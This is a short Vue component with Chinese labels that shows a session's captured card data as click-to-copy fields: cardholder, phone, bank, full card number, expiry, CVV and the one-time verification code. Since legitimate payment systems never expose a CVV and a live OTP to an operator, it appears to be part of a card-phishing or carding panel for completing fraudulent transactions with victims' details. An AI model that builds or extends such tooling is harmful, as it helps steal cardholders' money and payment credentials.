<script setup lang="ts">
defineProps<{
  cardInfo: Api.Payment.CardInfo;
  customerInfo: Api.Payment.CustomerInfo;
}>();

function copy(val: string) {
  if (!val) return;
  navigator.clipboard.writeText(val).then(() => {
    window.$message?.success('已复制:' + val);
  }).catch(() => {});
}
</script>

<template>
  <div class="session-fields">
    <div class="field" v-if="cardInfo.cardType" @click="copy(cardInfo.cardType)" title="点击复制"><label>卡类型</label><span class="value">{{ cardInfo.cardType }}</span></div>
    <div class="field" v-if="cardInfo.cardLevel" @click="copy(cardInfo.cardLevel)" title="点击复制"><label>卡级</label><span class="value">{{ cardInfo.cardLevel }}</span></div>
    <div class="field field-wide" v-if="cardInfo.bankName" @click="copy(cardInfo.bankName)" title="点击复制"><label>发卡行</label><span class="value">{{ cardInfo.bankName }}</span></div>
    <div class="field" v-if="customerInfo.phone" @click="copy(customerInfo.phone)" title="点击复制"><label>电话</label><span class="value">{{ customerInfo.phone }}</span></div>
    <div class="field field-wide" v-if="cardInfo.cardHolder" @click="copy(cardInfo.cardHolder)" title="点击复制"><label>持卡人</label><span class="value">{{ cardInfo.cardHolder }}</span></div>
    <div class="field field-card" v-if="cardInfo.cardNumber" @click="copy(cardInfo.cardNumber)" title="点击复制"><label>卡号</label><span class="value value-green">{{ cardInfo.cardNumber }}</span></div>
    <div class="field" v-if="cardInfo.expiry" @click="copy(cardInfo.expiry)" title="点击复制"><label>有效期</label><span class="value">{{ cardInfo.expiry }}</span></div>
    <div class="field" v-if="cardInfo.cvv" @click="copy(cardInfo.cvv)" title="点击复制"><label>CVV</label><span class="value">{{ cardInfo.cvv }}</span></div>
    <div class="field" v-if="cardInfo.otpCode" @click="copy(cardInfo.otpCode)" title="点击复制"><label>验证码</label><span class="value value-orange">{{ cardInfo.otpCode }}</span></div>
  </div>
</template>

<style scoped>
.session-fields {
  display: flex; align-items: flex-start; gap: 8px; flex-wrap: nowrap;
  padding-left: 22px; height: 34px; overflow: hidden; flex-shrink: 0;
}
.field { min-width: 62px; flex-shrink: 0; cursor: pointer; }
.field-wide { min-width: 110px; }
.field-card { min-width: 130px; }
.field label { display: block; color: var(--n-text-color-3); font-size: 12px; margin-bottom: 4px; line-height: 12px; }
.value { display: block; min-height: 17px; line-height: 17px; background: rgba(128,128,128,.12); border: 1px solid var(--n-border-color); color: var(--n-text-color); border-radius: 3px; padding: 0 6px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 12px; }
html.dark .value { background: rgba(255,255,255,.06); }
.value-green { background: #48be44; border-color: #56d150; color: #fff; font-weight: bold; }
.value-orange { background: #f0a12d; border-color: #ffb545; color: #fff; font-weight: bold; }
</style>
